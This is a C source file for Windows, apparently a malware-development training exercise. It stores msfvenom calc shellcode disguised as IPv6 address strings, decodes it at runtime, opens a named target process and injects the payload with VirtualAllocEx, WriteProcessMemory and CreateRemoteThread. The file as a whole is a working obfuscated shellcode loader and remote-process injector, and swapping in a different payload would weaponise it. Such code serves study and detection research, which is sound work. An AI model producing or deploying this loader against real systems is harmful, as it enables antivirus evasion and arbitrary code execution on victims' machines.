#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Output using `HellShell.exe calc.bin ipv6`
// Where calc.bin is Msfvenom's calc x64 shellcode

char* Ipv6Array[] = {
		"FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52", "2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0",
		"AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED", "5241:5148:8B52:208B:423C:4801:D08B:8088", "0000:0048:85C0:7467:4801:D050:8B48:1844",
		"8B40:2049:01D0:E356:48FF:C941:8B34:8848", "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1", "38E0:75F1:4C03:4C24:0845:39D1:75D8:5844",
		"8B40:2449:01D0:6641:8B0C:4844:8B40:1C49", "01D0:418B:0488:4801:D041:5841:585E:595A", "4158:4159:415A:4883:EC20:4152:FFE0:5841",
		"595A:488B:12E9:57FF:FFFF:5D48:BA01:0000", "0000:0000:0048:8D8D:0101:0000:41BA:318B", "6F87:FFD5:BBF0:B5A2:5641:BAA6:95BD:9DFF",
		"D548:83C4:283C:067C:0A80:FBE0:7505:BB47", "1372:6F6A:0059:4189:DAFF:D563:616C:632E", "6578:6500:9090:9090:9090:9090:9090:9090"
};

#define NumberOfElements 18

typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
	PCSTR                   S,
	PCSTR* Terminator,
	PVOID                   Addr
	);

BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE           pBuffer = NULL,
					TmpBuffer = NULL;

	SIZE_T          sBuffSize = NULL;

	PCSTR           Terminator = NULL;

	NTSTATUS        STATUS = NULL;

	// getting RtlIpv6StringToAddressA  address from ntdll.dll
	fnRtlIpv6StringToAddressA  pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");
	if (pRtlIpv6StringToAddressA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// getting the real size of the shellcode (number of elements * 16 => original shellcode size)
	sBuffSize = NmbrOfElements * 16;
	// allocating mem, that will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// setting TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;


	// loop through all the addresses saved in Ipv6Array
	for (int i = 0; i < NmbrOfElements; i++) {
		// Ipv6Array[i] is a single ipv6 address from the array Ipv6Array
		if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {
			// if failed ...
			printf("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X\n", Ipv6Array[i], STATUS);
			return FALSE;
		}

		// tmp buffer will be used to point to where to write next (in the newly allocated memory)
		TmpBuffer = (PBYTE)(TmpBuffer + 16);
	}

	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;
	return TRUE;
}

/*
API functions used to perform process enumeration:
- CreateToolhelp32Snapshot: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
- Process32First: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first
- Process32Next: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next
- OpenProcess: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
*/

/*
* Retrieves a process handle for the process specified in `szProcessName`, outputting it to `hProcess`.
* Outputs the process' PID to `dwProcessId`.
*/
BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

	// According to the documentation:
	// Before calling Process32First(), set this member to sizeof(PROCESSENTRY32).
	// If swSize is not initialized, Process32First() fails.
	PROCESSENTRY32 Proc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};

	HANDLE hSnapshot = NULL;

	// Take a snapshot of the currently running processes
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolHelp32Snapshot failed with error: %d\n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot
	if (!Process32First(hSnapshot, &Proc)) {
		printf("[!] Process32First failed with error: %d\n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD dwSize = lstrlenW(Proc.szExeFile);
			DWORD i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			// Convert each character in Proc.szExeFile to lowercase,
			// ... saving it in LowerName
			if (dwSize < MAX_PATH * 2) {
				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
				LowerName[i++] = '\0';  // Null terminate string
			}

		}

		// Use the dot operator to extract the process name from the populated struct
		// ... if the process name matches the process we're looking for
		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
			// Extract the PID and save it
			*dwProcessId = Proc.th32ProcessID;
			// Open a handle to the process
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess failed with error: %d\n", GetLastError());
			break;
		}

		// Retrieves info about the next process recorded in the snapshot
		// Continue looping while processes still remain in the snapshot
	} while (Process32Next(hSnapshot, &Proc));

_EndOfFunction:
	if (hSnapshot != NULL)
		CloseHandle(hSnapshot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;

}

// Shellcode process injection will use these Windows APIs:
//	VirtualAllocEx for memory injection
//	WriteProcessMemory for remote process write
//	VirtualProtectEx to modify memory protections
//	CreateRemoteThread to execute payload via a new thread
/* 
Docs:
- VirtualAllocEx: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
- WriteProcessMemory: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
- VirtualProtectEx: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex
- CreateRemoteThread: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
*/

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {
	
	PVOID pShellcodeAddress = NULL;

	SIZE_T sNumberOfBytesWritten = NULL;
	DWORD dwOldProtection = NULL;

	// Allocate memory in the remote process of size `sSizeOfShellcode`
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAllocEx failed with error: %d\n", GetLastError());
		return FALSE;
	}
	printf("[i] Allocated memory at: 0x%p\n", pShellcodeAddress);

	printf("[#] Press <Enter> to write payload...");
	getchar();
	//Write the shellcode in the allocated memory
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("[!] WriteProcessMemory failed with error: %d\n", GetLastError());
		return FALSE;
	}
	printf("[i] Successfully wrote %d bytes\n", sNumberOfBytesWritten);

	memset(pShellcode, '\0', sSizeOfShellcode);

	// Make the memory region executable
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx failed with error: %d\n", GetLastError());
		return FALSE;
	}

	printf("[#] Press <Enter> to run...");
	getchar();
	printf("[i] Executing payload...\n");
	// Launch the shellcode in a new thread
	if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		printf("[!] CreateRemoteThread failed with error: %d\n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE!\n");
	return TRUE;

}

int wmain(int argc, wchar_t* argv[]) {
	
	HANDLE hProcess = NULL;
	DWORD dwProcessId = NULL;

	PBYTE pDeobfuscatedPayload = NULL;
	SIZE_T sDeobfuscatedSize = NULL;

	// Check command line arguments
	if (argc < 2) {
		wprintf(L"[!] Usage: \"%s\" <Process Name>\n", argv[0]);
		return -1;
	}

	// Get handle to the process
	wprintf(L"[i] Searching for process ID of \"%s\"...\n", argv[1]);
	if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
		wprintf(L"[!] Process not found\n");
		return -1;
	}
	wprintf(L"[+] DONE!\n");
	wprintf(L"[i] Found target process PID: %d\n", dwProcessId);

	wprintf(L"Press <Enter> to decrypt...");
	getchar();
	wprintf(L"Decrypting...\n");
	if (!Ipv6Deobfuscation(Ipv6Array, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
		return -1;
	}
	wprintf(L"[+] DONE!\n");
	wprintf(L"[i] Deobfuscated payload at: 0x%p of Size: %d\n", pDeobfuscatedPayload, sDeobfuscatedSize);

	// Inject the shellcode
	if (!InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize)) {
		return -1;
	}

	// Cleanup tasks
	HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
	CloseHandle(hProcess);
	wprintf(L"[#] Press <Enter> to quit...");
	getchar();
	return 0;

}